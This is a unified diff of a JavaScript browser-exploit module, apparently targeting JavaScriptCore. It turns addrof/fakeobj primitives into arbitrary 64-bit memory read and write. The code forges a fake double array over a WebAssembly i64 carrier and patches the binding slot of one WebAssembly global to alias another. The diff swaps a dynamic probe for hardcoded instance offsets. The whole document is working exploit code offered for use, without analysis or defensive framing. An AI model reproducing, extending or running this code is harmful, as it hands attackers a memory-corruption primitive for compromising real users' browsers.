@@ -1,9 +1,8 @@
 // From addrof/fakeobj
 // -> forge a fake ArrayWithDouble over the i64 carrier            (Stage A)
-// -> pivot two real double arrays into a JSCell read/write (rwA/rwB)
-// -> steal the live ArrayWithDouble header
+// -> patch two Portable-global instances directly through the fake array
 // -> retarget one Portable global's binding slot at another's      (Stage B)
-// -> standing read64 / write64
+// -> read64 / write64
 //
 // Usage:
 //   const rw = new ArbitraryRW({ addrof, fakeobj });
@@ -37,7 +36,6 @@
     const toDouble = (v) => { _u64[0] = u64(v); return _f64[0]; };
     const toBits = (v) => { _f64[0] = v; return _u64[0]; };
     const hex = (v) => "0x" + u64(v).toString(16).padStart(16, "0");
-    function doubleArray() { const a = new Array(8); for (let i = 0; i < a.length; ++i) a[i] = 13.37 + i; return a; }
 
     // ---- embedded helper module: i64 carrier + exported mutable i64 global ----
     const WASM_BYTES = new Uint8Array([
@@ -75,11 +73,12 @@
             // Build-variable, but all have stable defaults for this engine family.
             this.carrierDataOffset = BigInt(o.carrierDataOffset ?? 0x20);          // sizeof(JSWebAssemblyArray)
             this.arrayBlob = BigInt(o.arrayBlob ?? 0x01082907);    // ArrayWithDouble: indexingType 0x07 | type | flags | cellState
+            this.arrayHeader = BigInt(o.arrayHeader ?? (this.arrayBlob << 32n));
             this.maxArrayLength = BigInt(o.maxArrayLength ?? 0x0fffffff);
-            this.sentinel = BigInt(o.sentinel ?? 0x00c0ffee11c0ffeen);
-            // Portable-binding-slot search tunables (dynamic probe; rarely need changing).
-            this.scanWords = Number(o.scanWords ?? 200);
-            this.instanceWindow = BigInt(o.instanceWindow ?? 0x4000);
+            this.instanceGlobalsOffset = BigInt(o.instanceGlobalsOffset ?? 0xb8);
+            this.instanceGlobalsToMarkOffset = BigInt(o.instanceGlobalsToMarkOffset ?? 0xc8);
+            this.instanceGlobalsToBindingOffset = BigInt(o.instanceGlobalsToBindingOffset ?? 0xd0);
+
             this.valueMin = BigInt(o.valueMin ?? 0x100000000n);
             this.valueMax = BigInt(o.valueMax ?? 0x8000000000000n);
 
@@ -92,7 +91,7 @@
             this._carrierGet = carrierExports.carrierGet;
             this._carrierSet = carrierExports.carrierSet;
 
-            this._live = [];           // keep every cell we depend on reachable
+            this._live = [];
             this._build();
         }
 
@@ -102,105 +101,93 @@
             const cset = (c, i, v) => this._carrierSet(c, i, i64(v));
             const cget = (c, i) => u64(this._carrierGet(c, i));
 
+            function prepare(marker) {
+                const instance = new WebAssembly.Instance(WASM_MODULE, {});
+                const get = instance.exports.gget, set = instance.exports.gset;
+                const keeper = instance.exports.target;
+                set(i64(marker));
+                if (u64(get()) !== marker) throw new Error("Portable global marker mismatch");
+                return { instance, get, set, keeper, marker };
+            }
+
+            const A = prepare(0x1122334455667788n);
+            const B = prepare(0x0000aaaa5555bbbbn);
+            const aCell = addrof(A.instance), bCell = addrof(B.instance);
+
             // forge a fake ArrayWithDouble over the GC-untraced i64 carrier.
             const carrier = makeCarrier();
             const carrierAddress = addrof(carrier);
             const payload = carrierAddress + this.carrierDataOffset;
             const fakeButterfly = payload + 3n * 8n;
             const packedLengths = (this.maxArrayLength << 32n) | this.maxArrayLength;
-            const BOOTSTRAP_HEADER = this.arrayBlob << 32n;
+            const BOOTSTRAP_HEADER = this.arrayHeader;
 
             cset(carrier, 0, BOOTSTRAP_HEADER);     // fake JSCell header
             cset(carrier, 1, fakeButterfly);        // fake m_butterfly -> carrier slot 3
             cset(carrier, 2, packedLengths);        // fake IndexingHeader (publicLength|vectorLength)
             cset(carrier, 3, 0n);
 
+            // From this part onwards, until we do fake = null, GC can potentially access and fault because structID = 0
+            // we try to minimise allocations during this window
             let fake = fakeobj(payload);
             fake[0] = toDouble(0x1122334455667788n);
             if (cget(carrier, 3) !== 0x1122334455667788n)
                 throw new Error("fake cell does not overlap carrier (wrong carrierDataOffset/arrayBlob for this build?)");
 
-            // Pivot: fake array writes rwA's butterfly to rwB's cell, so rwA[0] then
-            // retargets rwB's butterfly -> rwB reads/writes any live JSCell's words.
-            const template = doubleArray(), rwA = doubleArray(), rwB = doubleArray();
-            const rwAAddress = addrof(rwA), rwBAddress = addrof(rwB);
-            cset(carrier, 1, rwAAddress + 8n);
-            if (toBits(fake[0]) === 0n) throw new Error("cannot see rwA butterfly through the fake array");
-            fake[0] = toDouble(rwBAddress + 8n);
+            const pointFakeAt = (cellAddress) => cset(carrier, 1, cellAddress + 8n);
+            const readWord = (cellAddress, index) => {
+                pointFakeAt(cellAddress);
+                return toBits(fake[index]);
+            };
+            const writeWord = (cellAddress, index, value) => {
+                pointFakeAt(cellAddress);
+                fake[index] = toDouble(value);
+            };
+            const wordForOffset = (offset, name) => {
+                if (offset < 8n || (offset & 7n)) throw new Error(name + " must be aligned and >= 8");
+                return Number((offset - 8n) / 8n);
+            };
+
+            const globalsWord = wordForOffset(this.instanceGlobalsOffset, "instanceGlobalsOffset");
+            const markWord = wordForOffset(this.instanceGlobalsToMarkOffset, "instanceGlobalsToMarkOffset");
+            const bindingWord = wordForOffset(this.instanceGlobalsToBindingOffset, "instanceGlobalsToBindingOffset");
+            const aSlotAddress = readWord(aCell, globalsWord);
+            const bSlotAddress = readWord(bCell, globalsWord);
+            const instanceWordIndexForAddress = (instanceAddress, targetAddress, name) => {
+                const delta = targetAddress - (instanceAddress + 8n);
+                if (delta < 0n || (delta & 7n) || delta >= 0x8000n)
+                    throw new Error("implausible " + name + " instance-tail address: " + hex(targetAddress));
+                return Number(delta / 8n);
+            };
+            const aBindingSlotWord = instanceWordIndexForAddress(aCell, aSlotAddress, "A");
+            const bBindingSlotWord = instanceWordIndexForAddress(bCell, bSlotAddress, "B");
+            const aOriginalPointer = readWord(aCell, aBindingSlotWord);
+            const bOriginalPointer = readWord(bCell, bBindingSlotWord);
+            const emptyVisitBits = readWord(aCell, markWord);
+
+            // make GC happy
+            writeWord(aCell, bindingWord, emptyVisitBits);
+            writeWord(bCell, bindingWord, emptyVisitBits);
+
+            // A.slot.m_pointer = &B.slot
+            writeWord(aCell, aBindingSlotWord, bSlotAddress);
+            A.slot = { index: aBindingSlotWord, field: aSlotAddress, value: aOriginalPointer };
+            B.slot = { index: bBindingSlotWord, field: bSlotAddress, value: bOriginalPointer };
+
+            // Close the window for the vulnerable state of fake, now we are safe 
             fake = null;
-
-            const pointAt = (cell) => { rwA[0] = toDouble(addrof(cell) + 8n); };   // word N of a cell == offset 8 + N*8
-            const readWord = (cell, index) => { pointAt(cell); return toBits(rwB[index]); };
-            const writeWord = (cell, index, value) => { pointAt(cell); rwB[index] = toDouble(value); };
-
-            // Steal the genuine ArrayWithDouble header through the pivot (no hardcoded StructureID).
-            const sorted = [template, rwA, rwB].map(addrof).sort((x, y) => (x < y ? -1 : 1));
-            rwA[0] = toDouble(sorted[0] + 8n);
-            const headerSeed = toBits(rwB[Number((sorted[2] - (sorted[0] + 8n)) / 8n)]);
-            if ((headerSeed >> 32n) !== this.arrayBlob)
-                throw new Error("stolen header blob mismatch: " + hex(headerSeed));
-            this.arrayHeader = headerSeed;
-
-            // find each instance's Portable binding slot by probing — point a
-            // candidate word at a carrier word we control and see if global.get hands it
-            // back.
-            const self = this;
-            const sentinelIndex = 21;
-            function candidateSlots(instance) {
-                const base = addrof(instance);
-                const out = [];
-                for (let i = 0; i < self.scanWords; ++i) {
-                    const word = readWord(instance, i);
-                    if (!(word > base && word < base + self.instanceWindow)) continue;
-                    const delta = word - (base + 8n);
-                    if (delta < 0n || delta % 8n !== 0n) continue;
-                    const index = Number(delta / 8n);
-                    const value = readWord(instance, index);
-                    if (!(value > self.valueMin && value < self.valueMax)) continue;
-                    out.push({ index, field: base + 8n + BigInt(index) * 8n, value });
-                }
-                return out;
-            }
-            function findGlobalsSlot(instance, get) {
-                cset(carrier, sentinelIndex, self.sentinel);
-                const candidates = candidateSlots(instance);
-                if (candidates.length === 0) throw new Error("m_globals not found in instance payload");
-                for (const candidate of candidates) {
-                    writeWord(instance, candidate.index, payload + BigInt(sentinelIndex) * 8n);
-                    const observed = get();
-                    writeWord(instance, candidate.index, candidate.value);
-                    if (u64(observed) === self.sentinel) {
-                        if (u64(get()) === self.sentinel) throw new Error("global did not restore after probe");
-                        return candidate;
-                    }
-                }
-                throw new Error("no instance word behaves as the portable binding slot");
-            }
-            function prepare(marker) {
-                const instance = new WebAssembly.Instance(WASM_MODULE, {});
-                const get = instance.exports.gget, set = instance.exports.gset;
-                set(marker);
-                const slot = findGlobalsSlot(instance, get);
-                if (get() !== marker) throw new Error("global lost its marker during slot discovery");
-                return { instance, get, set, marker, slot };
-            }
-
-            const A = prepare(0x1122334455667788n);
-            const B = prepare(0x0000aaaa5555bbbbn);
-            writeWord(A.instance, A.slot.index, B.slot.field);   // A's binding slot now -> B's binding slot
 
             const read64 = (address) => { A.set(i64(address)); return u64(B.get()); };
             const write64 = (address, value) => { A.set(i64(address)); B.set(i64(value)); };
 
             if (read64(B.slot.value) !== B.marker) throw new Error("alias clobbered B's own global");
-            if ((read64(addrof(doubleArray())) >> 32n) !== this.arrayBlob) throw new Error("read64 self-test failed");
+            if (read64(payload) !== BOOTSTRAP_HEADER) throw new Error("read64 carrier-header self-test failed");
 
             this.read64 = read64;
             this.write64 = write64;
-            this._readWord = readWord;
-            this._writeWord = writeWord;
             this._A = A; this._B = B;
-            this._live.push(carrier, template, rwA, rwB, A.instance, B.instance);
+            this._carrier = carrier;
+            this._live.push(carrier, A.instance, B.instance, A.keeper, B.keeper);
             this._log("[+] ArbitraryRW ready (header " + hex(this.arrayHeader) + ")");
         }
 
